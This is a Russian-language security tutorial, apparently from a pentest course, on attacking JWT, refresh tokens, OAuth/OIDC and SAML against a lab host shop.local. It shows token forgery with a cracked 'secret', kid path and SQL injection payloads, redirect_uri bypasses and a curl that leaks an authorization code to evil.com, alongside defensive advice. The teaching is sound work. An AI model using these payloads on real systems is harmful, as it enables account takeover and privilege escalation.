## Задача

Сессии на cookie — только один способ помнить пользователя. Современные приложения всё чаще выдают **токены**: строку, которую клиент прикладывает к каждому запросу. Самый популярный формат — **JWT** (JSON Web Token). Рядом живут протоколы входа через сторонний сервис — **OAuth/OIDC** и корпоративный **SAML**. У каждого своя логика и свои ошибки.

Разберём один токен и один поток OAuth.

## Наш пример: JWT из заголовка Authorization

После входа мы получили токен:

```bash
$ curl -s -d 'user=alice&pass=alice123' https://shop.local/api/login | jq -r .access_token
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1aWQiOjQyLCJyb2xlIjoidXNlciJ9.7f3c...
```

JWT состоит из трёх частей через точку: **header.payload.signature**. Все три — base64url. Разберём первые две:

```bash
$ echo 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9' | base64 -d
{"alg":"HS256","typ":"JWT"}
$ echo 'eyJ1aWQiOjQyLCJyb2xlIjoidXNlciJ9' | base64 -d
{"uid":42,"role":"user"}
```

Важный вывод: **payload читается кем угодно** — это не шифр, а просто base64. Секретность даёт только подпись (`signature`): сервер считает HMAC от `header.payload` своим ключом и сверяет.

## Шаг 1: подпись ломается по-разному

Три классические атаки на JWT:

- **`alg:none`.** Меняем header на `{"alg":"none"}` и выкидываем подпись. Если сервер наивно доверяет полю `alg` — токен примут без проверки.
- **Слабый секрет.** HS256 подписывается паролем. Если это `secret` или `changeme` — подпись подделаешь офлайн.
- **Путаница алгоритмов.** Сервер ждёт RS256 (публичный ключ), но принимает HS256, подписанный... тем же публичным ключом как секретом.

Проверим секрет по словарю:

```bash
$ hashcat -m 16500 token.txt /usr/share/wordlists/rockyou.txt
eyJ...7f3c...:secret
Status...........: Cracked
```

Секрет `secret` — значит, мы можем подписать любой payload, например с `role:admin`:

```bash
$ python3 -c "import jwt;print(jwt.encode({'uid':42,'role':'admin'},'secret',algorithm='HS256'))"
eyJhbGciOiJIUzI1NiJ9.eyJ1aWQiOjQyLCJyb2xlIjoiYWRtaW4ifQ.4kQ...
```

## Шаг 2: refresh-токены и их жизненный цикл

Кроме короткоживущего `access_token` приложение выдаёт долгий `refresh_token`. Им обменивают просроченный access на новый:

```bash
$ curl -s -d 'grant_type=refresh_token&refresh_token=eyJ...' https://shop.local/api/token
{"access_token":"eyJ...new","expires_in":3600}
```

Ошибки здесь: refresh не отзывается после логаута; принимается повторно (replay) бесконечно; привязан к пользователю только полем `sub`, которое можно подменить при слабой подписи. Проверяй: отзывается ли refresh после выхода и можно ли использовать его дважды.

## Шаг 3: OAuth/OIDC — вход через чужой аккаунт

**OAuth 2.0** — это про **делегирование доступа** (например, «дай приложению доступ к моему профилю Google»), а **OIDC** — надстройка для входа («войди как я»). Поток в общем виде: приложение отправляет браузер на `/authorize`, провайдер возвращает `code` на `redirect_uri`, приложение меняет `code` на токен.

Главные ошибки:

- **Открытый `redirect_uri`.** Если провайдер не сверяет его строго, `code` уедет на наш домен:

```bash
$ curl -sI 'https://sso.shop.local/authorize?client_id=shop&redirect_uri=https://evil.com&response_type=code'
HTTP/1.1 302 Found
Location: https://evil.com/?code=ABC123
```

- **Отсутствие `state`.** Параметр `state` защищает от CSRF в OAuth. Без него можно привязать чужой аккаунт к своему (login CSRF).
- **`code` без PKCE** у публичных клиентов — перехватывается.

## Шаг 4: SAML — XML-конверт с подписью

Корпоративный вход часто на **SAML**: провайдер подписывает XML-утверждение (assertion) о пользователе и отправляет его приложению. Ошибки: подпись не проверяется вовсе, проверяется только один узел (XML Signature Wrapping — можно подсунуть второй assertion), или проверка имени пользователя через XPath-инъекцию:

```bash
$ echo 'user=admin@shop.local]|//*|' # попытка XPath-инъекции в NameID
```

SAML — это XML, а значит, наследует XXE и XPath-инъекции; всегда проверяй, включён ли парсинг внешних сущностей.

## Если не сработало

- **JWT подписан крепким секретом** — переключись на логику: проверь `exp`, `aud`, `iss`; иногда их просто не проверяют.
- **`alg:none` отклонён** — пробуй смену алгоритма (`HS256` ↔ `RS256`) и `kid`-инъекцию (путь к файлу или SQL в `kid`).
- **OAuth `redirect_uri` строгий** — ищи обходы: `https://shop.local.evil.com`, `?`-хвосты, поддомен-матч.
- **SAML подпись валидна** — смотри логику имени (XPath) и наличие XXE.

## Что мы теперь знаем

- JWT читается целиком; секретность держится только на подписи.
- Ломается на `alg:none`, слабом секрете и путанице алгоритмов.
- Refresh-токены опасны без отзыва и защиты от replay.
- OAuth/OIDC ломаются на `redirect_uri` и отсутствии `state`; SAML — на подписи и XML-инъекциях.

## Частые вопросы

**JWT можно расшифровать без секрета?** Да. JWT не шифрует данные — он их только **подписывает**. Header и payload декодируются кем угодно; секрет нужен лишь для проверки/подделки подписи.

**Значит, в JWT нельзя хранить секреты?** Нельзя хранить то, что не должен видеть клиент. Если нужно скрыть — используй шифрованный токен (JWE), а не обычный JWT.

**Почему `alg:none` вообще работает?** Потому что некоторые библиотеки берут алгоритм **из токена**, а не из своей конфигурации. Если сервер доверяет полю `alg`, он примет токен без подписи.

**OAuth и OIDC — это про пароли?** Нет. OAuth — про **делегирование доступа** (приложению дают право читать профиль), OIDC — надстройка для **входа**. Пароль вводится у провайдера, а не в приложении.

**Что самое опасное в OAuth?** Открытый `redirect_uri`: код авторизации утечёт на чужой домен, и атакующий обменяет его на токен. Всегда проверяй, сверяется ли `redirect_uri` строго.

**SAML мёртв, его ещё встречают?** В корпоративной среде — постоянно (SSO). И он наследует все проблемы XML: XXE, XPath-инъекции, обход подписи.

## Ещё один сценарий: kid-инъекция в JWT

Поле `kid` (key id) указывает, каким ключом проверять подпись. Если сервер берёт `kid` из токена и подставляет в путь или SQL, появляется инъекция:

```bash
$ echo '{"alg":"HS256","kid":"../../dev/null"}' | base64 -w0
eyJhbGciOiJIUzI1NiIsImtpZCI6Ii4uLy4uL2Rldi9udWxsIn0
# подписываем пустым ключом -> сервер читает ключ из /dev/null и принимает
```

Другой вариант — SQL в `kid`:

```bash
$ # kid = "x' UNION SELECT 'known-secret'-- -"
# сервер выполнит запрос и возьмёт 'known-secret' как ключ проверки
```

Обе атаки эксплуатируют **доверие к полю из токена** — тот же принцип, что и `alg:none`.

## На что смотреть дальше

- **`alg` и `kid`.** Оба поля присылает клиент — проверяй, доверяет ли им сервер.
- **Слабый секрет.** Гоняй HS256-токен через `hashcat -m 16500` и словарь.
- **Проверка claims.** `exp`, `nbf`, `aud`, `iss` — многие серверы их не проверяют.
- **Refresh.** Отзывается ли после логаута, можно ли использовать дважды.
- **OAuth.** Строгость `redirect_uri`, наличие `state`, использование PKCE.
- **SAML.** Проверка подписи целиком, XXE, XPath в `NameID`.
